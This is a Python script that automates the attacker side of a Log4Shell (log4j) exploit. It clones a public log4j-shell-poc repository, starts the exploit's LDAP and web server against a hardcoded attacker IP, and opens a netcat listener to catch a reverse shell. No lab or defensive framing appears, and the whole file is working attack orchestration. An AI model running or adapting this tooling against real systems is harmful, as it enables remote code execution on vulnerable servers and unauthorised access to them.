import os
import subprocess
import time

# Define the IP addresses and ports
attacker_ip = "192.168.34.147"
web_port = 8080
ldap_port = 1389
reverse_shell_port = 9001

# Set Up the Attacker Machine Environment
def setup_attacker():
    try:
        print("Setting up the attacker machine...")
        commands = [
            "sudo apt update",
            "sudo git clone https://github.com/kozmer/log4j-shell-poc.git",
            "sudo mv jdk1.8.0_20/ /home/attacker/log4j-shell-poc",
            "cd log4j-shell-poc && pip3 install -r requirements.txt"
        ]
        for cmd in commands:
            subprocess.run(cmd, shell=True, check=True)
        print("Attacker machine setup complete.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to set up attacker machine: {e}")

# Start the PoC Server
def start_poc_server():
    try:
        subprocess.Popen(['python3', 'poc.py', '--userip', attacker_ip, '--webport', str(web_port), '--lport', str(reverse_shell_port)], cwd='/home/attacker/log4j-shell-poc')
        print(f"PoC server started on {attacker_ip}:{web_port} and {ldap_port}")
    except Exception as e:
        print(f"Failed to start PoC server: {e}")

# Start the Netcat Listener
def start_nc_listener():
    try:
        subprocess.Popen(['nc', '-lvnp', str(reverse_shell_port)])
        print(f"Netcat listener started on port {reverse_shell_port}. Waiting for manual payload injection.")
    except Exception as e:
        print(f"Failed to start Netcat listener: {e}")

if __name__ == "__main__":
    # Set up the environment on both machines
    setup_attacker()

    # Wait a few seconds to ensure everything is ready
    time.sleep(10)

    # Start the PoC server and Netcat listener
    start_poc_server()
    time.sleep(5)
    start_nc_listener()

    # Keep the script running indefinitely
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Exploitation terminated by user.")
